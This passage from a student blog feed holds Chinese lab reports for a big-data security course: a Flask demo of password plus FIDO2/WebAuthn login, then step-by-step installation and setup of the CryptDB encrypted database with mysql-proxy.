class="line"></span><br><span class="line"><span class="comment"># 全局用户存储（实际应用应使用数据库）</span></span><br><span class="line">users = &#123;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>配置说明</strong>：</p>
<p>RP Entity：代表依赖方（应用程序），用于标识应用</p>
<p>origin 验证函数：确保FIDO2请求来自正确的源</p>
<p>users字典：存储用户信息，包括密码哈希和FIDO2凭证</p>
<p><strong>（3）用户注册界面</strong></p>
<p><strong>后端路由</strong> (&#x2F;register)：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/register&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = request.form[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">        password = request.form[<span class="string">&quot;password&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;User already exists&quot;</span>, <span class="number">400</span></span><br><span class="line">        hashed_password = generate_password_hash(password)</span><br><span class="line">        users[username] = &#123;<span class="string">&quot;password&quot;</span>: hashed_password, <span class="string">&quot;credentials&quot;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;fido_setup&quot;</span>, username=username))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;register.html&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><strong>前端界面</strong> (register.html)：</p>
<p>用户输入用户名和密码</p>
<p>前端验证两次密码输入是否一致</p>
<p>提交表单后，后端存储加密的密码，并重定向到FIDO2设置页面</p>
<p><strong>（4）FIDO2设置页面</strong></p>
<p><strong>后端路由</strong>(&#x2F;fido_setup)：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/fido_setup/&lt;username&gt;&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fido_setup</span>(<span class="params">username</span>):</span><br><span class="line">    <span class="keyword">if</span> username <span class="keyword">not</span> <span class="keyword">in</span> users:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User not found&quot;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;fido_setup.html&quot;</span>, username=username)</span><br></pre></td></tr></table></figure>

<p><strong>前端交互</strong> (fido_setup.html)：</p>
<p>显示FIDO2设置步骤指引</p>
<p>用户点击”开始FIDO2注册”按钮</p>
<p>前端向&#x2F;fido_register发送请求获取注册选项</p>
<p><strong>（5）生成FIDO2注册选项</strong></p>
<p><strong>后端路由</strong>(&#x2F;fido_register)：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/fido_register&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fido_register</span>():</span><br><span class="line">    username = request.form.get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> username <span class="keyword">not</span> <span class="keyword">in</span> users:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;User not found&quot;</span>&#125;), <span class="number">404</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        user_entity = PublicKeyCredentialUserEntity(</span><br><span class="line">            <span class="built_in">id</span>=username.encode(),</span><br><span class="line">            name=username,</span><br><span class="line">            display_name=username</span><br><span class="line">        )</span><br><span class="line">        registration_data, state = server.register_begin(user_entity)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 存储状态到会话</span></span><br><span class="line">        session[<span class="string">&quot;fido_registration_state&quot;</span>] = state</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 将 registration_data 转换为可序列化的格式</span></span><br><span class="line">        pk = registration_data.public_key</span><br><span class="line">        challenge = base64.b64encode(pk.challenge).decode()</span><br><span class="line">        user_id = base64.b64encode(pk.user.<span class="built_in">id</span>).decode()</span><br><span class="line">        </span><br><span class="line">        response_data = &#123;</span><br><span class="line">            <span class="string">&quot;publicKey&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;challenge&quot;</span>: challenge,</span><br><span class="line">                <span class="string">&quot;rp&quot;</span>: &#123;<span class="string">&quot;name&quot;</span>: pk.rp.name, <span class="string">&quot;id&quot;</span>: pk.rp.<span class="built_in">id</span>&#125;,</span><br><span class="line">                <span class="string">&quot;user&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;id&quot;</span>: user_id,</span><br><span class="line">                    <span class="string">&quot;name&quot;</span>: pk.user.name,</span><br><span class="line">                    <span class="string">&quot;displayName&quot;</span>: pk.user.display_name</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">&quot;pubKeyCredParams&quot;</span>: [</span><br><span class="line">                    &#123;<span class="string">&quot;type&quot;</span>: <span class="string">&quot;public-key&quot;</span>, <span class="string">&quot;alg&quot;</span>: param.alg&#125;</span><br><span class="line">                    <span class="keyword">for</span> param <span class="keyword">in</span> pk.pub_key_cred_params</span><br><span class="line">                ],</span><br><span class="line">                <span class="string">&quot;timeout&quot;</span>: <span class="number">60000</span>,</span><br><span class="line">                <span class="string">&quot;attestation&quot;</span>: <span class="string">&quot;direct&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> jsonify(response_data)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="built_in">str</span>(e)&#125;), <span class="number">400</span></span><br></pre></td></tr></table></figure>

<p><strong>前端处理</strong> (fido_setup.html)：</p>
<p>接收注册选项，将 Base64 编码的数据转换为ArrayBuffer</p>
<p>调用navigator.credentials.create()创建FIDO2凭证</p>
<p>用户使用生物识别或硬件密钥完成认证</p>
<p><strong>（6）完成FIDO2注册</strong></p>
<p><strong>后端路由</strong> (&#x2F;fido_complete_register)：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/fido_complete_register&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fido_complete_register</span>():</span><br><span class="line">    data = request.get_json()</span><br><span class="line">    username = data.get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> username <span class="keyword">not</span> <span class="keyword">in</span> users:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;User not found&quot;</span>&#125;), <span class="number">404</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        state = session.pop(<span class="string">&quot;fido_registration_state&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> state:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Registration state not found&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">from</span> fido2.webauthn <span class="keyword">import</span> CollectedClientData, AttestationObject</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 解码 Base64 数据</span></span><br><span class="line">        client_data_bytes = base64.b64decode(data[<span class="string">&quot;response&quot;</span>][<span class="string">&quot;clientDataJSON&quot;</span>])</span><br><span class="line">        attestation_object_bytes = base64.b64decode(data[<span class="string">&quot;response&quot;</span>][<span class="string">&quot;attestationObject&quot;</span>])</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 创建对象并完成注册</span></span><br><span class="line">        client_data = CollectedClientData(client_data_bytes)</span><br><span class="line">        attestation_object = AttestationObject(attestation_object_bytes)</span><br><span class="line">        auth_data = server.register_complete(state, client_data, attestation_object)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 存储凭证数据</span></span><br><span class="line">        <span class="keyword">from</span> fido2 <span class="keyword">import</span> cbor</span><br><span class="line">        cred_id = base64.b64encode(auth_data.credential_data.credential_id).decode()</span><br><span class="line">        public_key = auth_data.credential_data.public_key</span><br><span class="line">        public_key_bytes = cbor.encode(public_key)</span><br><span class="line">        </span><br><span class="line">        users[username][<span class="string">&quot;credentials&quot;</span>] = json.dumps(&#123;</span><br><span class="line">            <span class="string">&quot;credential_id&quot;</span>: cred_id,</span><br><span class="line">            <span class="string">&quot;public_key&quot;</span>: base64.b64encode(public_key_bytes).decode()</span><br><span class="line">        &#125;)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;registered&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="built_in">str</span>(e)&#125;), <span class="number">400</span></span><br></pre></td></tr></table></figure>

<p><strong>（7）用户登录</strong></p>
<p><strong>后端路由</strong>(&#x2F;login)：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = request.form[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">        password = request.form[<span class="string">&quot;password&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">not</span> <span class="keyword">in</span> users <span class="keyword">or</span> <span class="keyword">not</span> check_password_hash(users[username][<span class="string">&quot;password&quot;</span>], password):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Invalid username or password&quot;</span>, <span class="number">400</span></span><br><span class="line">        session[<span class="string">&quot;username&quot;</span>] = username</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;fido_auth&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><strong>前端交互</strong> (login.html)：</p>
<p>用户输入用户名和密码</p>
<p>前端提交表单到后端验证</p>
<p>验证成功后，自动请求FIDO2认证选项</p>
<p><strong>（8）FIDO2认证</strong></p>
<p><strong>后端路由</strong> (&#x2F;fido_auth)：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/fido_auth&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fido_auth</span>():</span><br><span class="line">    username = session.get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> username <span class="keyword">not</span> <span class="keyword">in</span> users:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Unauthorized&quot;</span>, <span class="number">401</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> users[username].get(<span class="string">&quot;credentials&quot;</span>) <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User has no FIDO2 credentials&quot;</span>, <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cred_data = json.loads(users[username][<span class="string">&quot;credentials&quot;</span>])</span><br><span class="line">        credential_id = base64.b64decode(cred_data[<span class="string">&quot;credential_id&quot;</span>])</span><br><span class="line">        </span><br><span class="line">        credential_descriptor = PublicKeyCredentialDescriptor(</span><br><span class="line">            <span class="built_in">type</span>=<span class="string">&quot;public-key&quot;</span>,</span><br><span class="line">            <span class="built_in">id</span>=credential_id</span><br><span class="line">        )</span><br><span class="line">        </span><br><span class="line">        authentication_data, state = server.authenticate_begin([credential_descriptor])</span><br><span class="line">        session[<span class="string">&quot;fido_authentication_state&quot;</span>] = state</span><br><span class="line">        </span><br><span class="line">        pk = authentication_data.public_key</span><br><span class="line">        challenge = base64.b64encode(pk.challenge).decode()</span><br><span class="line">        cred_id_encoded = base64.b64encode(credential_id).decode()</span><br><span class="line">        </span><br><span class="line">        response_data = &#123;</span><br><span class="line">            <span class="string">&quot;publicKey&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;challenge&quot;</span>: challenge,</span><br><span class="line">                <span class="string">&quot;timeout&quot;</span>: <span class="number">60000</span>,</span><br><span class="line">                <span class="string">&quot;rpId&quot;</span>: pk.rp_id,</span><br><span class="line">                <span class="string">&quot;userVerification&quot;</span>: <span class="string">&quot;preferred&quot;</span>,</span><br><span class="line">                <span class="string">&quot;allowCredentials&quot;</span>: [</span><br><span class="line">                    &#123;<span class="string">&quot;type&quot;</span>: <span class="string">&quot;public-key&quot;</span>, <span class="string">&quot;id&quot;</span>: cred_id_encoded&#125;</span><br><span class="line">                ]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> jsonify(response_data)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="built_in">str</span>(e)&#125;), <span class="number">400</span></span><br></pre></td></tr></table></figure>

<p><strong>（9）完成FIDO2登录</strong></p>
<p><strong>后端路由</strong> (&#x2F;fido_login)：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/fido_login&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fido_login</span>():</span><br><span class="line">    username = session.get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> username <span class="keyword">not</span> <span class="keyword">in</span> users:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Unauthorized&quot;</span>&#125;), <span class="number">401</span></span><br><span class="line">    </span><br><span class="line">    data = request.get_json()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        state = session.pop(<span class="string">&quot;fido_authentication_state&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> state:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Authentication state not found&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line">        </span><br><span class="line">        cred_data = json.loads(users[username][<span class="string">&quot;credentials&quot;</span>])</span><br><span class="line">        stored_cred_id = base64.b64decode(cred_data[<span class="string">&quot;credential_id&quot;</span>])</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">from</span> fido2 <span class="keyword">import</span> cbor</span><br><span class="line">        public_key_bytes = base64.b64decode(cred_data[<span class="string">&quot;public_key&quot;</span>])</span><br><span class="line">        public_key = cbor.decode(public_key_bytes)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">from</span> fido2.webauthn <span class="keyword">import</span> CollectedClientData, AuthenticatorData, AttestedCredentialData, Aaguid</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 解码 Base64 数据</span></span><br><span class="line">        credential_id = base64.b64decode(data[<span class="string">&quot;id&quot;</span>])</span><br><span class="line">        client_data_bytes = base64.b64decode(data[<span class="string">&quot;response&quot;</span>][<span class="string">&quot;clientDataJSON&quot;</span>])</span><br><span class="line">        authenticator_data_bytes = base64.b64decode(data[<span class="string">&quot;response&quot;</span>][<span class="string">&quot;authenticatorData&quot;</span>])</span><br><span class="line">        signature = base64.b64decode(data[<span class="string">&quot;response&quot;</span>][<span class="string">&quot;signature&quot;</span>])</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 创建对象</span></span><br><span class="line">        client_data = CollectedClientData(client_data_bytes)</span><br><span class="line">        authenticator_data = AuthenticatorData(authenticator_data_bytes)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 重建 AttestedCredentialData 对象用于验证</span></span><br><span class="line">        attested_cred_data = AttestedCredentialData.create(</span><br><span class="line">            aaguid=Aaguid.NONE,</span><br><span class="line">            credential_id=stored_cred_id,</span><br><span class="line">            public_key=public_key</span><br><span class="line">        )</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 完成认证</span></span><br><span class="line">        server.authenticate_complete(</span><br><span class="line">            state,</span><br><span class="line">            [attested_cred_data],</span><br><span class="line">            credential_id,</span><br><span class="line">            client_data,</span><br><span class="line">            authenticator_data,</span><br><span class="line">            signature</span><br><span class="line">        )</span><br><span class="line">        </span><br><span class="line">        session[<span class="string">&quot;authenticated&quot;</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;authenticated&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="built_in">str</span>(e)&#125;), <span class="number">400</span></span><br></pre></td></tr></table></figure>

<p><strong>（10）仪表板和登出</strong></p>
<p><strong>后端路由</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&quot;authenticated&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;dashboard&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/dashboard&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dashboard</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&quot;authenticated&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line">    username = session.get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;dashboard.html&quot;</span>, username=username)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/logout&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    session.clear()</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;index&quot;</span>))</span><br></pre></td></tr></table></figure>

<p><strong>3.最后运行本项目，执行python app.py</strong></p>
<p><img src="/2025/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A3/image-5.png" alt="图5"></p>
<p>前往<a href="http://localhost:5000/register%E6%B3%A8%E5%86%8C%E6%96%B0%E7%94%A8%E6%88%B7">http://localhost:5000/register注册新用户</a></p>
<p>前往<a href="http://localhost:5000/login%E8%BF%9B%E8%A1%8C%E7%99%BB%E5%BD%95">http://localhost:5000/login进行登录</a></p>
<p><strong>4.以下是界面操作展示</strong></p>
<p>（1）网站界面</p>
<p><img src="/2025/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A3/image-6.png" alt="图6"></p>
<p>（2）创建新用户</p>
<p><img src="/2025/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A3/image-7.png" alt="图7"></p>
<p><img src="/2025/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A3/image-8.png" alt="图8"></p>
<p><img src="/2025/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A3/image-9.png" alt="图9"></p>
<p>（3）用户登录</p>
<p><img src="/2025/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A3/image-10.png" alt="图10"></p>
<p><img src="/2025/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A3/image-11.png" alt="图11"></p>
<p>（4）登录界面</p>
<p><img src="/2025/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A3/image-12.png" alt="图12"></p>
<p><strong>四、总结实现原理</strong></p>
<p><strong>用户注册：</strong>在&#x2F;register页面，用户提供用户名和密码进行注册。注册成功后，系统将用户信息（用户名和加密后的密码）存储到内存中，并将用户重定向到 &#x2F;fido_setup 页面进行FIDO2凭证绑定。</p>
<p><strong>FIDO2设置：</strong>在&#x2F;fido_setup路由，用户点击”开始FIDO2注册”按钮后，前端向 &#x2F;fido_register路由发送请求。后端生成注册选项（包含challenge、用户信息、RP信息等），并将其转换为JSON格式返回给前端。前端通过 navigator.credentials.create()调用用户的FIDO2设备（如生物识别或硬件密钥）创建凭证。生成的凭证数据（包含clientDataJSON和attestationObject）通过 &#x2F;fido_complete_register路由发送回服务器，服务器验证并保存凭证信息（credential_id和public_key）到用户账户中。</p>
<p><strong>用户登录：</strong>用户在&#x2F;login页面输入用户名和密码。后端验证用户名和密码是否正确。若正确，系统将用户名存储到会话中，并将用户重定向到FIDO2认证流程。</p>
<p><strong>FIDO2验证：</strong>登录表单提交后，前端向&#x2F;fido_auth路由请求认证选项。后端根据存储的凭证信息生成认证选项（包含challenge和allowCredentials），返回给前端。前端调用navigator.credentials.get()完成FIDO2设备验证。验证成功后，生成的凭证数据（包含clientDataJSON、authenticatorData和signature）通过&#x2F;fido_login路由发送到服务器进行最终验证。服务器验证签名和数据的完整性，若通过，则在会话中设置authenticated标志，用户便可访问&#x2F;dashboard仪表盘。</p>
]]></content>
      <categories>
        <category>第5学期实验</category>
        <category>大数据安全作业</category>
      </categories>
      <tags>
        <tag>北邮</tag>
        <tag>实验</tag>
        <tag>大数据安全</tag>
      </tags>
  </entry>
  <entry>
    <title>大数据安全实验3：CryDB</title>
    <url>/2025/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="加密数据库的安装与使用"><a href="#加密数据库的安装与使用" class="headerlink" title="加密数据库的安装与使用"></a>加密数据库的安装与使用</h2><h3 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h3><p>（1）基础部分：任选一个加密数据库，参照使用手册安装配置系统，演示系统的核心功能。</p>
<p>a.参考实验指导书，完成加密数据CryptDB的演示实验：</p>
<p><a href="http://css.csail.mit.edu/cryptdb/">http://css.csail.mit.edu/cryptdb/</a></p>
<p>b.其他加密数据库，例如Blind seer（2014），Arx 2017。</p>
<p>（2）拓展部分：调研分析与改进性实验</p>
<p><strong>a.对CryptDB的安全性进行调研分析。</strong></p>
<p>公开的研究结果，例如</p>
<p>2015_CCS_Inference Attacks on Property-Preserving Encrypted Databases</p>
<p>Seny Kamara. Attacking encrypted database systems, blog post, Outsourced bits, snapshot as of Sept 7, 2015</p>
<p>你自己的研究和发现</p>
<p><strong>b.对CryptDB的功能改进进行调研。</strong></p>
<p>例如，”CryptZip: Squeezing out the Redundancy in Homomorphically Encrypted Backup Data.” In Proceedings of the 9th Asia-Pacific Workshop on Systems, pp. 1-8. 2018.</p>
<p><strong>c.同类系统调研分析。也可以设计自己的改进方案。</strong></p>
<h3 id="基础部分"><a href="#基础部分" class="headerlink" title="基础部分"></a>基础部分</h3><p>（1）安装git和ruby：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install git ruby</span><br></pre></td></tr></table></figure>

<p><img src="/2025/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/image-1.png" alt="图1"></p>
<p>（2）克隆CryptDB代码到用户主目录下面，这里已经提前克隆好了，在用户主目录下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> -b public git://g.csail.mit.edu/cryptdb</span><br></pre></td></tr></table></figure>

<p><img src="/2025/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/image-2.png" alt="图2"></p>
<p><img src="/2025/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/image-3.png" alt="图3"></p>
<p>（3）执行安装脚本：进入到cryptdb目录下进行安装。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> cryptdb</span><br><span class="line"><span class="built_in">sudo</span> ./scripts/install.rb ~/cryptdb</span><br></pre></td></tr></table></figure>

<p><img src="/2025/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/image-4.png" alt="图4"></p>
<p>安装中会弹出该对话框，需要数据库初始化密码，我使用letmein。输入后只需等待安装即可，以下是安装过程。</p>
<p><img src="/2025/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/image-5.png" alt="图5"></p>
<p>安装完成后结果如图。</p>
<p><img src="/2025/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/image-6.png" alt="图6"></p>
<p>（4）添加环境变量EDBDIR到.bashrc：在home目录下打开.bashrc文件，将export EDBDIR&#x3D;&#x2F;home&#x2F;lhl&#x2F;cryptdb&#x2F;添加到最后。重启后即可使用CryptDB。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> vim ~/.bashrc</span><br><span class="line"><span class="built_in">export</span> EDBDIR=/home/lhl/cryptdb</span><br></pre></td></tr></table></figure>

<p><img src="/2025/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/image-7.png" alt="图7"></p>
<p>（5）本实验使用了三个终端：</p>
<p>终端1：用于运行 CryptDB，在上面显示密文；</p>
<p>终端2：用于从代理端口3306访问数据库，显示用户实际操作状态；</p>
<p>终端3：用于从正常端口3307访问数据库，显示明文</p>
<p>MySQL使用本地3306端口，CryptDB使用本地3307端口，CryptDB 把3307端口的数据处理后通过3306端口与 MySQL 交互</p>
<p>（6）在终端1中输入如下内容，系统返回started即为执行成功：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/home/lhl/cryptdb/bins/proxy-bin/bin/mysql-proxy \</span><br><span class="line">--plugins=proxy --event-threads=4 \</span><br><span class="line">--max-open-files=1024 \</span><br><span class="line">--proxy-lua-script=<span class="variable">$EDBDIR</span>/mysqlproxy/wrapper.lua \</span><br><span class="line">--proxy-address=127.0.0.1:3307 \</span><br><span class="line">--proxy-backend-addresses=localhost:3306</span><br></pre></td></tr></table></figure>

<p><img src="/2025/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/image-8.png" alt="图8"></p>
<p>（7）在终端2中输入如下命令，连接到本机3306端口的mysql</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -u root -p -h 127.0.0.1 -P 3306</span><br></pre></td></tr></table></figure>

<p><img src="/2025/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/image-9.png" alt="图9"></p>
<p>（8）在终端3中输入如下命令，连接到本机3307端口的CryptDB</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -u root -p -h 127.0.0.1 -P 3307</span><br></pre></td></tr></table></figure>

<p><img src="/2025/10/29/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/image-10.png" alt="图10"></p>
<p>（9）在终端3中查询数据库，此时在终端1中显示CryptDB查询数据库的结果。</p>
